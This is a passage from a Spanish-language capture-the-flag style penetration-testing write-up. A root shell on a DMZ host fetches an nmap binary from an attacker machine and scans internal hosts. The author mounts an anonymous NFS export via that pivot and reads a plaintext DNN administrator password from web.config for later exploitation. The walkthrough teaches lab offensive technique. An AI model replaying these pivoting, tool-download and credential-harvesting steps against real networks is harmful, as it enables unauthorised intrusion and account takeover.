Connecting to 10.10.15.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 217115 (212K) [application/octet-stream]
Saving to: ‘nmap’

nmap                                      100%[====================================================================================>] 212.03K  --.-KB/s    in 0.1s    

2025-04-09 19:28:04 (1.51 MB/s) - ‘nmap’ saved [217115/217115]

root@dmz01:~# ls
flag.txt  nmap  snap
root@dmz01:~# 
```

```shell-session
root@dmz01:~# chmod +x nmap 
root@dmz01:~# ./nmap -v --open -iL targets

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-04-09 19:50 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Initiating ARP Ping Scan at 19:50
Scanning 3 hosts [1 port/host]

Nmap scan report for 172.16.8.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00056s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:94:1B:80 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00057s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:94:2A:82 (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00058s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:94:FC:67 (Unknown)

Read data files from: /etc
Nmap done: 3 IP addresses (3 hosts up) scanned in 144.39 seconds
           Raw packets sent: 5000 (219.952KB) | Rcvd: 5000 (200.108KB)
```

Tenemos datos de los 3 hosts:

#### 🖥️ **Host: 172.16.8.3**

**Perfil:** Servidor con servicios de autenticación y directorio, probablemente un **controlador de dominio (AD)**.

* **Servicios clave detectados:**
  * `Kerberos (88/tcp)` y `kpasswd (464/tcp)` → Sistema de autenticación, común en entornos Windows AD.
  * `LDAP (389/tcp)` y `LDAPS (636/tcp)` → Protocolo de directorios (posible Active Directory).
  * `NetBIOS (139/tcp)` y `SMB (445/tcp)` → Compartición de archivos en red.
  * `DNS (53/tcp)` → Indica que podría resolver nombres internamente.
  * `epmap (135/tcp)` y puerto `593/tcp` abierto (RPC) → Soporte para DCOM/RPC.

**Análisis rápido:**\
Posiblemente es un **controlador de dominio Windows Server**, usado para autenticación y gestión centralizada de red.

#### 🖥️ **Host: 172.16.8.20**

**Perfil:** Servidor mixto, probablemente un **servidor de archivos con acceso remoto** y servicios NFS.

* **Servicios clave detectados:**
  * `HTTP (80/tcp)` → Página web o servicio web en ejecución.
  * `NFS (2049/tcp)` y `sunrpc (111/tcp)` → Exportación de archivos tipo Unix/Linux.
  * `SMB (445/tcp)`, `NetBIOS (139/tcp)` y `epmap (135/tcp)` → Soporte Windows.
  * `RDP (3389/tcp)` → Acceso remoto a escritorio (Windows Terminal Services).

**Análisis rápido:**\
Servidor híbrido (Linux/Unix + Windows) con NFS y RDP habilitados. Puede estar exponiendo archivos compartidos o ser una **máquina de uso general para administración remota**.

#### 🖥️ **Host: 172.16.8.50**

**Perfil:** Máquina orientada a acceso remoto y posible interfaz web de administración.

* **Servicios clave detectados:**
  * `RDP (3389/tcp)` → Acceso de escritorio remoto.
  * `HTTP-alt (8080/tcp)` → Servicio web no estándar (aplicación en desarrollo, dashboard o consola admin).
  * `SMB/NetBIOS` (`135`, `139`, `445`) → Acceso compartido de archivos y servicios DCOM.

**Análisis rápido:**\
Podría ser una **estación de trabajo remota o servidor web de pruebas** con acceso vía navegador y RDP.

***

### Montar el recurso compartido NFS

El puerto 2049, NFS, siempre es interesante. Podemos usar ["showmount"](https://linux.die.net/man/8/showmount) para listar las exportaciones, que podríamos montar y explorar de forma similar a cualquier otro recurso compartido de archivos. Encontramos una exportación, `DEV01`, accesible para todos (acceso anónimo). Veamos qué contiene.

```shell-session
afsh4ck@kali$ proxychains showmount -e 172.16.8.20

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:111-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:2049-<><>-OK
Export list for 172.16.8.20:
/DEV01 (everyone)
```

No podemos montar el recurso compartido NFS mediante Proxychains, pero tenemos acceso root al host `dmz01` para intentarlo. Vemos algunos archivos relacionados con DNN y un subdirectorio `DNN`.

```shell-session
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
root@dmz01:/tmp# cd DEV01/
root@dmz01:/tmp/DEV01# ls

BuildPackages.bat            CKToolbarSets.xml  WatchersNET.CKEditor.sln
CKEditorDefaultSettings.xml  DNN
CKToolbarButtons.xml         flag.txt
```

El subdirectorio `DNN` es muy interesante, ya que contiene un archivo `web.config`. Al verificar el contenido del archivo, encontramos lo que parece ser la contraseña de administrador para la instancia DNN.

```shell-session
root@dmz01:/tmp/DEV01/DNN# cat web.config 

<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
```

Usaremos estas credenciales para la siguiente sección de explotación.

### Lectura de la flag

```shell-session
root@dmz01:/tmp/DEV01# ls
BuildPackages.bat            CKToolbarSets.xml  WatchersNET.CKEditor.sln
CKEditorDefaultSettings.xml  DNN
CKToolbarButtons.xml         flag.txt

root@dmz01:/tmp/DEV01# cat flag.txt 
bf22a1d0acfca4af51***************
```
